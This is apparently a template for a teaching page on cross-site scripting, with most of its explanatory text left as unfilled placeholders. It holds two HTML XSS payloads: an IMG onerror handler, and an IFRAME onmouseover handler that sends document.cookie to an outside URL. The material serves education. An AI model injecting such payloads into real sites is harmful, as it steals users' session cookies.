# ![ico-30 study] XSS

{{p1}}
{{p2}}

{{p3}}
{{p4}}

{{p5}}
{{p6}}
{{p7}}
{{p8}}

{{p9}}

{{p10}}

![](illustrations/xss-atack.png)

{{p11}}

{{p12}}

~~~html
&lt;IMG SRC="images/hack.png"
     onerror="document.write(String.fromCharCode(88, 83, 83))"/>
~~~

{{p13}}

{{p14}}

![](illustrations/xss-atack-cookie.png)

{{p15}}

~~~html
&lt;IFRAME SRC=js/attack.html
  onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' + document.cookie, '_self')">
</IFRAME>
~~~

{{p16}}

{{p17}}

{{p18}}


## ![ico-25 hw] {{common.c8}}

{{p19}}

{{p20}}

![](illustrations/xss-atack-breakpoints.png)

{{p21}}

{{p22}}

{{p23}}

{{p24}}

__________________________________________________________

[![ico-20 link] XSS](https://owasp.org/www-community/attacks/xss/)
[![ico-20 link] websitesecurity](https://www.acunetix.com/websitesecurity/cross-site-scripting/)
